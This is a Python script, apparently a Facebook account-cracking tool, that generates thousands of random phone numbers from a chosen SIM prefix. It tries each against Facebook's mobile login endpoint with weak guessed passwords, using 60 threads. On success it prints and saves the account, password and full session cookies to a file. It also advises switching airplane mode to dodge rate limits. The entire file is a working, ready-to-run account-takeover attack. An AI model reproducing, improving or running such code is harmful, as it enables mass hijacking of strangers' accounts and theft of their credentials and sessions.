import os, time, sys, uuid, random, requests, re
from concurrent.futures import ThreadPoolExecutor

# ANSI Colors
G = '\033[1;32m'; W = '\033[1;37m'; R = '\033[1;31m'; Y = '\033[1;33m'

loop = 0
ok = []

def banner():
    os.system('clear')
    print(f"""{G}
     ███    ███  ███████  ████████  █████  
     ████  ████  ██          ██    ██   ██ 
     ██ ████ ██  █████       ██    ███████ 
     ██  ██  ██  ██          ██    ██   ██ 
     ██      ██  ███████     ██    ██   ██ 
{W}×××××××××××××××××××××××××××××××××××××××××××××××××
 [✓] DEVELOPER : MD MALEK ISLAM (META REAL)
 [✓] LOGIC     : RAFI SAR + MALEK (HYBRID)
 [✓] STATUS    : 10K LIMIT & REAL SUCCESS RATE
{W}×××××××××××××××××××××××××××××××××××××××××××××××××""")

def main():
    banner()
    print(f'{G} [1] START REAL TIME CLONING (10K)')
    print(f' [0] EXIT')
    choose = input(f'\n{G} [?] CHOOSE : {W}')
    if choose == '1': cloning_start()
    else: sys.exit()

def cloning_start():
    banner()
    print(f'{G} [+] ENTER TARGET SIM CODE (e.g. 017, 018) : {W}')
    code = input(f' [?] CODE : ')
    limit = 10000 
    
    # Using 50-60 workers for Laptop power to avoid crash
    with ThreadPoolExecutor(max_workers=60) as meta:
        banner()
        print(f'{G} [/] ATTACK RUNNING ON {code} | LIMIT: {limit}')
        print(f'{Y} [!] TIP: Switch Airplane Mode every 5 minutes.\n')
        for _ in range(limit):
            uid = code + "".join(random.choices("0123456789", k=8))
            meta.submit(touch_engine, uid, limit)

    print(f'\n{G} [✓] FINISHED. TOTAL SUCCESS: {len(ok)}')
    input(f' [ BACK ]'); main()

def touch_engine(uid, limit):
    global loop, ok
    # Standard output style as per your requirement
    sys.stdout.write(f'\r{W} [MALEK-SCAN] {loop}/{limit} [OK:{len(ok)}] '); sys.stdout.flush()
    
    # Enhanced Password List (More success probability)
    pws = [uid, uid[4:], uid[-6:], "@@##1122", "778899", "police786", "bangladesh", "I love you", "password123"]
    
    for pas in pws:
        session = requests.Session()
        # RAFI SAR'S ASYNC TOUCH LINK
        url = "https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
        
        # Combined 10-item Header for real success
        headers = {
            'Host': 'touch.facebook.com',
            'X-FB-LSD': str(uuid.uuid4()),
            'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
            'sec-ch-ua-mobile': '?1',
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            'Accept': '*/*',
            'Origin': 'https://touch.facebook.com',
            'Referer': 'https://touch.facebook.com/login/',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'X-Requested-With': 'XMLHttpRequest'
        }

        try:
            # Step 1: Get Initial Cookies
            res = session.get('https://touch.facebook.com/login/').text
            # Step 2: Post Data with 10 Items
            data = {
                "lsd": re.search('name="lsd" value="(.*?)"', str(res)).group(1),
                "jazoest": re.search('name="jazoest" value="(.*?)"', str(res)).group(1),
                "m_ts": re.search('name="m_ts" value="(.*?)"', str(res)).group(1),
                "li": re.search('name="li" value="(.*?)"', str(res)).group(1),
                "try_number": "0",
                "unrecognized_tries": "0",
                "email": uid, 
                "pass": pas,
                "login": "Log In",
                "bi_xrwh": "0"
            }
            
            # Step 3: Response Logic Check
            post = session.post(url, data=data, headers=headers)
            
            if 'c_user' in session.cookies.get_dict():
                print(f'\n{G} [MALEK-OK💚] {uid} • {pas}')
                # Extracting all cookies including datr, sb, c_user, xs
                ck = "; ".join([f"{k}={v}" for k, v in session.cookies.get_dict().items()])
                print(f'{G} [🌺] COOKIE = {ck}\n')
                ok.append(uid)
                # Saving to the path you've already given permission
                with open('/sdcard/MALEK_ULTIMATE.txt', 'a') as f:
                    f.write(f'{uid}|{pas}|{ck}\n')
                break
        except: pass
    loop += 1

if __name__ == "__main__":
    main()
